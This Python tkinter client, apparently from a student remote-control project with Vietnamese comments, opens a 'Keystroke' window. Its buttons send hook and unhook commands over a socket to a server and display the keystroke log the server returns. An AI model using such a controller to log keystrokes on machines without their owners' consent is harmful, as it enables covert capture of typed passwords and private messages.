from socket import AF_INET, socket, SOCK_STREAM
from threading import Thread
import os
from tkinter import Tk, W, E
from tkinter import Tk, Text, TOP, BOTH, X, N, LEFT
from tkinter.ttk import Frame, Label, Button, Entry
from tkinter import ttk
from tkinter import *
from tkinter import font
from tkinter import messagebox
from tkinter import filedialog
from PIL import ImageTk,Image
from tkinter.filedialog import asksaveasfile
import sys
import cv2
import pickle
import numpy as np
import struct ## new
import zlib
from PIL import Image
from PIL import Image
import requests
from io import BytesIO

def KeystrokeMain(client):
	# Tạo ra cửa sổ của Keystroke
		logger = ''
		Stroke = Tk()
		Stroke.title("Keystroke")  
		Stroke.geometry("410x320")
		Stroke.configure(bg = 'white')
		frame_stroke = Frame(Stroke, bg = "#FFEFDB", padx=20, pady = 20, borderwidth=5)
		frame_stroke.grid(row=1,column=0)
		tab = Text(Stroke, width = 50, heigh = 15)
		tab.grid(row = 1, column = 0, columnspan= 4)
		PrsHook = False
		PrsUnhook = False

		def ReceiveHook(client):
			data = client.recv(1024).decode("utf-8")			# Nhận dữ liệu từ server
			# string = data										# Chuyển dữ liệu thành string
			client.sendall(bytes(data,"utf-8"))  				# Gửi dữ liệu đến server
			return data

		def Hookkey():
			nonlocal PrsHook, PrsUnhook
			if PrsHook == True: return
			PrsHook = True
			PrsUnhook = False
			client.sendall(bytes("HookKey","utf-8"))
			checkdata = client.recv(1024).decode("utf-8")

		def Unhookkey():
			nonlocal logger, PrsUnhook, PrsHook
			if PrsHook == True:
				client.sendall(bytes("UnhookKey","utf-8"))    
				logger = ReceiveHook(client)
				client.sendall(bytes(logger,"utf-8")) 
				PrsUnhook = True
				PrsHook = False

		def Printkey():
			nonlocal logger, PrsUnhook, PrsHook
			if PrsUnhook == False: 
				client.sendall(bytes("UnhookKey","utf-8"))
				logger = ReceiveHook(client)
			tab.delete(1.0, END)
			tab.insert(1.0, logger)
			PrsUnhook = True
			PrsHook = False

		def Deletekey():
			tab.delete(1.0,END)
					    
		hook = Button(Stroke, text = "Hook", font = "Helvetica 10 bold",bg = "#FFDEAD", padx = 27, pady = 24, command = Hookkey).grid(row = 2,column = 0,sticky=E)
		unhook = Button(Stroke, text = "Unhook",font = "Helvetica 10 bold", bg = "#EECFA1", padx = 27, pady = 24, command = Unhookkey).grid(row = 2,column = 1,sticky=E) 
		prs = Button(Stroke, text = "In phím",font = "Helvetica 10 bold",bg = "#CDB38B", padx = 27, pady = 24,command = Printkey).grid(row = 2,column = 2,sticky=E)
		delete = Button(Stroke, text = "Delete", font = "Helvetica 10 bold", bg = "#8B795E",padx = 27, pady = 24,command = Deletekey).grid(row = 2,column = 3,sticky=E)
